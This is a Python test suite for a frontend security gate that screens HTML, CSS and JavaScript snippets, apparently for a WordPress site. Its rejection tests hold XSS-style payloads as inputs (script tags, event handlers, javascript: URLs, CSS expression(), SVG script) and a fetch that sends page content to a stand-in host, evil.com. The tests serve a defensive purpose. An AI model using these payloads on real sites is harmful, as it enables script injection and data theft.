#!/usr/bin/env python3
"""Tests for Phase 7B-4 FrontendSecurityGate."""

import os
import sys

from contracts import FrontendSecurityResult
from tools.frontend_security import FrontendSecurityGate


class MockConfig:
    wordpress_url = None
    allowed_domains = None


def make_gate(config=None):
    if config is None:
        config = MockConfig()
    return FrontendSecurityGate(config)


# ========================
# Safe cases
# ========================

def test_safe_html():
    gate = make_gate()
    result = gate.check(html="<div class='hello'>Hello</div>", css="", javascript="")
    assert result.passed is True
    assert result.errors == []


def test_safe_css():
    gate = make_gate()
    result = gate.check(html="", css="body { color: #333; }", javascript="")
    assert result.passed is True
    assert result.errors == []


def test_empty_javascript():
    gate = make_gate()
    result = gate.check(html="", css="", javascript="")
    assert result.passed is True
    assert result.errors == []


def test_gsap_style_animation():
    gate = make_gate()
    js = """
    gsap.to(".box", {
      x: 100,
      opacity: 0.5,
      scrollTrigger: {
        trigger: ".box",
        start: "top center",
        scrub: true,
      }
    });
    """
    result = gate.check(html="", css="", javascript=js)
    assert result.passed is True
    assert result.errors == []


def test_same_domain_image_url():
    config = MockConfig()
    config.wordpress_url = "https://www.bencent.cc"
    config.allowed_domains = ["www.bencent.cc"]
    gate = make_gate(config)
    result = gate.check(
        html='<img src="https://www.bencent.cc/wp-content/uploads/hero.jpg" alt="hero">',
        css="",
        javascript="",
    )
    assert result.passed is True
    assert result.errors == []


def test_allowlisted_cdn_url():
    config = MockConfig()
    config.allowed_domains = ["cdn.bencent.cc", "fonts.googleapis.com"]
    gate = make_gate(config)
    result = gate.check(
        html='<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+TC">',
        css="",
        javascript="",
    )
    assert result.passed is True
    assert result.errors == []


# ========================
# HTML rejection
# ========================

def test_script_tag_rejected():
    gate = make_gate()
    result = gate.check(html="<script>alert(1)</script>", css="", javascript="")
    assert result.passed is False
    assert any("script" in item.lower() for item in result.blocked_items)


def test_onclick_handler_rejected():
    gate = make_gate()
    result = gate.check(html='<button onclick="alert(1)">Click</button>', css="", javascript="")
    assert result.passed is False
    assert any("handler" in item.lower() for item in result.blocked_items)


def test_onerror_handler_rejected():
    gate = make_gate()
    result = gate.check(html='<img src=x onerror="alert(1)">', css="", javascript="")
    assert result.passed is False
    assert any("handler" in item.lower() for item in result.blocked_items)


def test_javascript_url_rejected():
    gate = make_gate()
    result = gate.check(html='<a href="javascript:alert(1)">link</a>', css="", javascript="")
    assert result.passed is False
    assert any("javascript:" in item.lower() for item in result.blocked_items)


def test_iframe_tag_rejected():
    gate = make_gate()
    result = gate.check(html='<iframe src="https://evil.com"></iframe>', css="", javascript="")
    assert result.passed is False
    assert any("iframe" in item.lower() for item in result.blocked_items)


def test_external_resource_rejected():
    gate = make_gate()
    config = MockConfig()
    config.allowed_domains = ["www.bencent.cc"]
    result = gate.check(
        html='<img src="https://evil.com/track.gif">',
        css="",
        javascript="",
    )
    assert result.passed is False
    assert any("external" in item.lower() for item in result.blocked_items)


# ========================
# CSS rejection
# ========================

def test_expression_rejected():
    gate = make_gate()
    result = gate.check(html="", css="body { width: expression(document.body.offsetWidth); }", javascript="")
    assert result.passed is False
    assert any("expression" in item.lower() for item in result.blocked_items)


def test_behavior_rejected():
    gate = make_gate()
    result = gate.check(html="", css="body { behavior: url(evil.htc); }", javascript="")
    assert result.passed is False
    assert any("behavior" in item.lower() for item in result.blocked_items)


def test_non_allowlisted_import_rejected():
    gate = make_gate()
    config = MockConfig()
    config.allowed_domains = ["www.bencent.cc"]
    result = gate.check(
        html="",
        css='@import url("https://evil.com/style.css");',
        javascript="",
    )
    assert result.passed is False
    assert any("import" in item.lower() for item in result.blocked_items)


# ========================
# JavaScript rejection
# ========================

def test_eval_rejected():
    gate = make_gate()
    result = gate.check(html="", css="", javascript='eval("alert(1)")')
    assert result.passed is False
    assert any("eval" in item.lower() for item in result.blocked_items)


def test_new_function_rejected():
    gate = make_gate()
    result = gate.check(html="", css="", javascript='new Function("alert(1)")')
    assert result.passed is False
    assert any("new Function" in item for item in result.blocked_items)


def test_document_cookie_rejected():
    gate = make_gate()
    result = gate.check(html="", css="", javascript='document.cookie')
    assert result.passed is False
    assert any("document.cookie" in item for item in result.blocked_items)


def test_window_location_rejected():
    gate = make_gate()
    result = gate.check(html="", css="", javascript='window.location = "https://evil.com"')
    assert result.passed is False
    assert any("window.location" in item for item in result.blocked_items)


def test_fetch_non_allowlisted_rejected():
    gate = make_gate()
    config = MockConfig()
    config.allowed_domains = ["www.bencent.cc"]
    result = gate.check(
        html="",
        css="",
        javascript='fetch("https://evil.com/steal", { method: "POST", body: document.body.innerHTML })',
    )
    assert result.passed is False
    assert any("fetch" in item.lower() for item in result.blocked_items)


def test_xmlhttprequest_rejected():
    gate = make_gate()
    result = gate.check(html="", css="", javascript='var xhr = new XMLHttpRequest(); xhr.open("GET", "https://evil.com");')
    assert result.passed is False
    assert any("XMLHttpRequest" in item for item in result.blocked_items)


def test_dynamic_script_creation_rejected():
    gate = make_gate()
    result = gate.check(html="", css="", javascript='document.createElement("script")')
    assert result.passed is False
    assert any("dynamic script" in item.lower() for item in result.blocked_items)


# ========================
# Size limits
# ========================

def test_html_over_limit():
    gate = make_gate()
    large_html = "x" * (101 * 1024)
    result = gate.check(html=large_html, css="", javascript="")
    assert result.passed is False
    assert any("html:size:" in item for item in result.blocked_items)


def test_css_over_limit():
    gate = make_gate()
    large_css = "x" * (51 * 1024)
    result = gate.check(html="", css=large_css, javascript="")
    assert result.passed is False
    assert any("css:size:" in item for item in result.blocked_items)


def test_javascript_over_limit():
    gate = make_gate()
    large_js = "x" * (51 * 1024)
    result = gate.check(html="", css="", javascript=large_js)
    assert result.passed is False
    assert any("javascript:size:" in item for item in result.blocked_items)


def test_total_over_limit():
    gate = make_gate()
    large_html = "x" * (101 * 1024)
    large_css = "y" * (51 * 1024)
    large_js = "z" * (51 * 1024)
    result = gate.check(html=large_html, css=large_css, javascript=large_js)
    assert result.passed is False
    assert any("total:size:" in item for item in result.blocked_items)


# ========================
# Result behavior
# ========================

def test_multiple_violations():
    gate = make_gate()
    result = gate.check(
        html="<script>alert(1)</script><iframe src='https://evil.com'></iframe>",
        css="body { expression(alert(1)); }",
        javascript='eval("alert(1)")',
    )
    assert result.passed is False
    assert len(result.errors) >= 3
    assert len(result.blocked_items) >= 3


def test_no_silent_truncation():
    gate = make_gate()
    large_html = "<div>" + ("a" * (101 * 1024)) + "</div>"
    result = gate.check(html=large_html, css="", javascript="")
    assert result.passed is False
    assert result.html == large_html
    assert len(result.html) == len(large_html)


def test_no_secrets_exposed():
    gate = make_gate()
    result = gate.check(
        html="",
        css="",
        javascript='var api_key = "sk-1234567890abcdef"; eval(api_key);',
    )
    assert result.passed is False
    assert "sk-1234567890abcdef" not in str(result.errors)
    assert "sk-1234567890abcdef" not in str(result.blocked_items)


# ========================
# Disguised attacks
# ========================

def test_img_src_javascript_url():
    gate = make_gate()
    result = gate.check(html='<img src="javascript:alert(1)">', css="", javascript="")
    assert result.passed is False
    assert any("javascript:" in item.lower() for item in result.blocked_items)


def test_onload_attribute_rejected():
    gate = make_gate()
    result = gate.check(html='<body onload="alert(1)">', css="", javascript="")
    assert result.passed is False
    assert any("onload" in item.lower() for item in result.blocked_items)


def test_mixed_case_eval():
    gate = make_gate()
    result = gate.check(html="", css="", javascript='EvAl("alert(1)")')
    assert result.passed is False
    assert any("eval" in item.lower() for item in result.blocked_items)


# ========================
# CSS URL rejection (Phase 7B-4A)
# ========================

def test_css_cursor_javascript_url_rejected():
    gate = make_gate()
    result = gate.check(html="", css='body { cursor: url(javascript:alert(1)); }', javascript="")
    assert result.passed is False
    assert any("url" in item.lower() for item in result.blocked_items)


def test_css_background_javascript_url_rejected():
    gate = make_gate()
    result = gate.check(html="", css='body { background-image: url(javascript:alert(1)); }', javascript="")
    assert result.passed is False
    assert any("url" in item.lower() for item in result.blocked_items)


def test_css_vbscript_url_rejected():
    gate = make_gate()
    result = gate.check(html="", css='body { background: url(vbscript:msgbox(1)); }', javascript="")
    assert result.passed is False
    assert any("vbscript" in item.lower() for item in result.blocked_items)


def test_css_non_image_data_url_rejected():
    gate = make_gate()
    result = gate.check(html="", css='body { background: url(data:text/html,<script>alert(1)</script>); }', javascript="")
    assert result.passed is False
    assert any("data:" in item.lower() for item in result.blocked_items)


def test_css_allowed_data_image_url():
    config = MockConfig()
    config.allowed_domains = ["www.bencent.cc"]
    gate = make_gate(config)
    result = gate.check(
        html="",
        css='body { background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==); }',
        javascript="",
    )
    assert result.passed is True
    assert result.errors == []


def test_css_allowed_relative_url():
    gate = make_gate()
    result = gate.check(html="", css='body { background: url(/wp-content/uploads/bg.png); }', javascript="")
    assert result.passed is True
    assert result.errors == []


# ========================
# SVG rejection (Phase 7B-4A)
# ========================

def test_svg_script_tag_rejected():
    gate = make_gate()
    result = gate.check(
        html='<svg><script>alert(1)</script></svg>',
        css="",
        javascript="",
    )
    assert result.passed is False
    assert any("svg:tag:script" in item.lower() for item in result.blocked_items)


def test_svg_onload_handler_rejected():
    gate = make_gate()
    result = gate.check(
        html='<svg onload="alert(1)"><circle cx="50" cy="50" r="40"/></svg>',
        css="",
        javascript="",
    )
    assert result.passed is False
    # Caught by HTML parser as svg[onload] or SVG parser
    assert any("onload" in item.lower() for item in result.blocked_items)


def test_svg_javascript_url_rejected():
    gate = make_gate()
    result = gate.check(
        html='<svg><a xlink:href="javascript:alert(1)"><text>Click</text></a></svg>',
        css="",
        javascript="",
    )
    assert result.passed is False
    assert any("javascript:" in item.lower() for item in result.blocked_items)


def test_svg_external_resource_rejected():
    gate = make_gate()
    config = MockConfig()
    config.allowed_domains = ["www.bencent.cc"]
    gate = make_gate(config)
    result = gate.check(
        html='<svg><image xlink:href="https://evil.com/steal.svg"/></svg>',
        css="",
        javascript="",
    )
    assert result.passed is False
    assert any("svg:url:" in item.lower() for item in result.blocked_items)


def test_svg_safe_allowed():
    config = MockConfig()
    config.allowed_domains = ["www.bencent.cc"]
    gate = make_gate(config)
    result = gate.check(
        html='<svg><circle cx="50" cy="50" r="40" fill="blue"/></svg>',
        css="",
        javascript="",
    )
    assert result.passed is True
    assert result.errors == []


if __name__ == "__main__":
    tests = [
        test_safe_html,
        test_safe_css,
        test_empty_javascript,
        test_gsap_style_animation,
        test_same_domain_image_url,
        test_allowlisted_cdn_url,
        test_script_tag_rejected,
        test_onclick_handler_rejected,
        test_onerror_handler_rejected,
        test_javascript_url_rejected,
        test_iframe_tag_rejected,
        test_external_resource_rejected,
        test_expression_rejected,
        test_behavior_rejected,
        test_non_allowlisted_import_rejected,
        test_eval_rejected,
        test_new_function_rejected,
        test_document_cookie_rejected,
        test_window_location_rejected,
        test_fetch_non_allowlisted_rejected,
        test_xmlhttprequest_rejected,
        test_dynamic_script_creation_rejected,
        test_html_over_limit,
        test_css_over_limit,
        test_javascript_over_limit,
        test_total_over_limit,
        test_multiple_violations,
        test_no_silent_truncation,
        test_no_secrets_exposed,
        test_img_src_javascript_url,
        test_onload_attribute_rejected,
        test_mixed_case_eval,
        # CSS URL (Phase 7B-4A)
        test_css_cursor_javascript_url_rejected,
        test_css_background_javascript_url_rejected,
        test_css_vbscript_url_rejected,
        test_css_non_image_data_url_rejected,
        test_css_allowed_data_image_url,
        test_css_allowed_relative_url,
        # SVG (Phase 7B-4A)
        test_svg_script_tag_rejected,
        test_svg_onload_handler_rejected,
        test_svg_javascript_url_rejected,
        test_svg_external_resource_rejected,
        test_svg_safe_allowed,
    ]

    passed = 0
    failed = 0
    for test in tests:
        try:
            test()
            passed += 1
            print(f"PASS: {test.__name__}")
        except AssertionError as e:
            failed += 1
            print(f"FAIL: {test.__name__}: {e}")
        except Exception as e:
            failed += 1
            print(f"ERROR: {test.__name__}: {e}")

    print(f"\n{passed} passed, {failed} failed out of {len(tests)} tests")
    if failed:
        sys.exit(1)